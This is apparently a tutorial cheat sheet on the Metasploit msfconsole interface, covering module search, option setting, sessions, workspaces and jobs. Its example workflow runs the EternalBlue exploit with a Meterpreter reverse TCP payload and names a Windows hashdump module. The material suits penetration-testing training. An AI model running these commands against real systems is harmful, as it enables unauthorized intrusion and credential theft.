# Metasploit Interface

## What is Metasploit Interface?
- Metasploit has multiple ways to interact with it
- Most common is msfconsole command line interface
- Understanding interface is first step to using Metasploit
- Each command has specific purpose and syntax
- Interface is same on all Linux distributions

---

## Ways to Access Metasploit

### msfconsole
- Primary and most powerful interface
- Command line based
- Full access to all features
- Most commonly used by professionals
- Interactive shell environment

### msfdb
- Database management interface
- Manages PostgreSQL database
- Initializes and manages workspace data

### msfvenom
- Standalone payload generator
- Creates custom payloads and shellcode
- Used outside of msfconsole
- Combines msfpayload and msfencode

### Armitage
- Graphical user interface for Metasploit
- Visual network map
- Point and click exploitation
- Good for beginners
- Less used by professionals

---

## Starting Metasploit

### Start Database First
```bash
# start postgresql database
sudo service postgresql start

# initialize metasploit database
sudo msfdb init

# check database status
sudo msfdb status
```

### Start msfconsole
```bash
# start metasploit console
msfconsole

# start with quiet mode no banner
msfconsole -q

# start and run specific command
msfconsole -x "use exploit/multi/handler"
```

---

## msfconsole Interface Overview

### Banner
- Shown when msfconsole starts
- Displays Metasploit version
- Shows number of exploits payloads and auxiliaries
- Random ASCII art displayed each time

### Prompt
- Shows current context
- Default prompt: msf6 >
- Module prompt: msf6 exploit(module_name) >
- Changes based on selected module

### Command Input
- Type commands after prompt
- Press Tab for autocomplete
- Press Up arrow for command history
- Press Ctrl+C to cancel running command

---

## msfconsole Basic Commands

### Help Commands
```bash
# show all available commands
help

# show help for specific command
help search
help use
help set

# show version information
version
```

### Navigation Commands
```bash
# go back to previous context
back

# exit metasploit
exit
quit

# clear screen
clear

# show current module info
info
```

### History Commands
```bash
# show command history
history

# search command history
history | grep search
```

---

## Module Navigation Commands

### Search Command
```bash
# search for modules by keyword
search eternalblue
search ms17-010
search apache
search windows smb

# search by type
search type:exploit
search type:auxiliary
search type:payload
search type:post

# search by platform
search platform:windows
search platform:linux
search platform:android

# search by CVE
search cve:2021-44228
search cve:2017-0144

# combined search
search type:exploit platform:windows smb
```

### Use Command
```bash
# select a module by name
use exploit/windows/smb/ms17_010_eternalblue

# select a module by search result number
use 0
use 1
use 2

# select auxiliary module
use auxiliary/scanner/portscan/tcp

# select post module
use post/windows/gather/hashdump
```

### Info Command
```bash
# show detailed information about current module
info

# show info about specific module
info exploit/windows/smb/ms17_010_eternalblue

# shows:
# name and description
# authors
# targets
# options required
# references CVE links
```

---

## Options and Configuration Commands

### Show Command
```bash
# show current module options
show options

# show available payloads for current exploit
show payloads

# show available targets
show targets

# show advanced options
show advanced

# show all exploits
show exploits

# show all auxiliaries
show auxiliary

# show all payloads
show payloads

# show all post modules
show post
```

### Set Command
```bash
# set required option
set RHOSTS 192.168.1.1
set RPORT 445
set LHOST 192.168.1.100
set LPORT 4444

# set payload
set PAYLOAD windows/meterpreter/reverse_tcp

# set target
set TARGET 0

# set verbose output
set VERBOSE true
```

### Setg Command
```bash
# set global option applies to all modules
setg RHOSTS 192.168.1.1
setg LHOST 192.168.1.100

# global settings persist when switching modules
```

### Unset Command
```bash
# unset specific option
unset RHOSTS
unset LHOST

# unset all options
unset all

# unset global option
unsetg RHOSTS
```

---

## Execution Commands

### Run and Exploit Commands
```bash
# run current module
run

# run exploit module
exploit

# run in background
run -j
exploit -j

# run with specific timeout
run -t 30
```

### Check Command
```bash
# check if target is vulnerable without exploiting
check

# not all modules support check
# shows vulnerable or not vulnerable
```

---

## Session Management Commands

### Sessions Command
```bash
# list all active sessions
sessions
sessions -l

# interact with specific session
sessions -i 1
sessions -i 2

# kill specific session
sessions -k 1

# kill all sessions
sessions -K

# run command on all sessions
sessions -C "sysinfo"

# upgrade shell to meterpreter
sessions -u 1
```

---

## Database Commands

### Workspace Commands
```bash
# show all workspaces
workspace

# create new workspace
workspace -a project_name

# switch to workspace
workspace project_name

# delete workspace
workspace -d project_name

# rename workspace
workspace -r old_name new_name
```

### Database Interaction Commands
```bash
# show hosts discovered
hosts

# show services discovered
services

# show credentials found
creds

# show vulnerabilities found
vulns

# show loot collected
loot

# show notes saved
notes

# import nmap scan results
db_import scan_results.xml

# run nmap from within metasploit
db_nmap -sV 192.168.1.0/24
```

---

## Auxiliary Module Interface

### Using Auxiliary Modules
```bash
# select auxiliary module
use auxiliary/scanner/portscan/tcp

# show options
show options

# set target
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
set THREADS 10

# run scan
run
```

---

## Jobs Management

### Jobs Commands
```bash
# show running jobs
jobs
jobs -l

# kill specific job
jobs -k 1

# kill all jobs
jobs -K
```

---

## Output and Logging

### Spool Command
```bash
# save all output to file
spool /home/kali/metasploit_output.txt

# stop saving output
spool off
```

### Resource Scripts
```bash
# run commands from file
resource /path/to/script.rc

# create resource script
# save commonly used commands in .rc file
# run automatically on msfconsole start
msfconsole -r script.rc
```

---

## msfconsole Color Coding
- Red text → errors and failures
- Green text → success messages
- Yellow text → warnings and important info
- Blue text → informational messages
- White text → normal output

---

## Tab Autocomplete
```bash
# press Tab to autocomplete commands
use exploit/windows/  # press Tab to see options
set PAYLOAD windows/  # press Tab to see payloads
search apache         # press Tab for suggestions
```

---

## Common msfconsole Workflow
```bash
# step 1 start database
sudo service postgresql start

# step 2 start metasploit
msfconsole -q

# step 3 create workspace
workspace -a new_project

# step 4 scan target
db_nmap -sV 192.168.1.1

# step 5 search for exploit
search ms17-010

# step 6 use exploit
use exploit/windows/smb/ms17_010_eternalblue

# step 7 show options
show options

# step 8 set options
set RHOSTS 192.168.1.1
set LHOST 192.168.1.100

# step 9 set payload
set PAYLOAD windows/meterpreter/reverse_tcp

# step 10 run exploit
exploit
```

---

## Important Points
- Always start postgresql before msfconsole
- Use workspace to organize different engagements
- Tab autocomplete saves time and avoids typos
- Use search before manually typing module paths
- Show options before running any module
- Use run -j to run modules in background
- Sessions command manages all active connections
- Spool command saves output for reporting
- Resource scripts automate repetitive tasks
- Always use Metasploit only on authorized systems
---
